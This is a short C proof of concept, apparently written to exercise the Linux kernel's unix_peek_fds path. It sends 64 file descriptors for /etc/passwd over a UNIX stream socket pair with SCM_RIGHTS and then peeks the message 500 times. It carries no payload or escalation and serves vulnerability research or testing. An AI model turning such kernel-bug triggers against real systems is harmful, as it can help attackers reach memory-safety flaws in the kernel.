/*
 * PoC for WMI-3: unix_peek_fds
 * Send SCM_RIGHTS with many fds, then peek many times
 * Also try the SOCK_STREAM path specifically
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>

#define NUM_FDS 64
#define NUM_PEEKS 500

int main(int argc, char *argv[])
{
    int sv[2];
    int fds_to_send[NUM_FDS];
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(NUM_FDS * sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    /* Create a socket pair (STREAM) */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    /* Open many files to send as SCM_RIGHTS */
    for (i = 0; i < NUM_FDS; i++) {
        fds_to_send[i] = open("/etc/passwd", O_RDONLY);
        if (fds_to_send[i] < 0) {
            perror("open");
            return 1;
        }
    }

    /* Send message with SCM_RIGHTS */
    memset(&msg, 0, sizeof(msg));
    memset(buf, 0x41, sizeof(buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);

    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(NUM_FDS * sizeof(int));
    for (i = 0; i < NUM_FDS; i++)
        ((int *)CMSG_DATA(cmsg))[i] = fds_to_send[i];

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return 1;
    }
    printf("sendmsg succeeded, sent %d bytes with %d fds\n", ret, NUM_FDS);

    /* Peek many times to trigger unix_peek_fds repeatedly */
    for (i = 0; i < NUM_PEEKS; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            perror("recvmsg (peek)");
            return 1;
        }
    }
    printf("Peeked %d times successfully\n", NUM_PEEKS);

    /* Now consume the message */
    memset(&msg, 0, sizeof(msg));
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    ret = recvmsg(sv[1], &msg, 0);
    if (ret < 0) {
        perror("recvmsg (consume)");
        return 1;
    }
    printf("Consumed message, got %d bytes\n", ret);

    for (i = 0; i < NUM_FDS; i++)
        close(fds_to_send[i]);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed successfully\n");
    return 0;
}
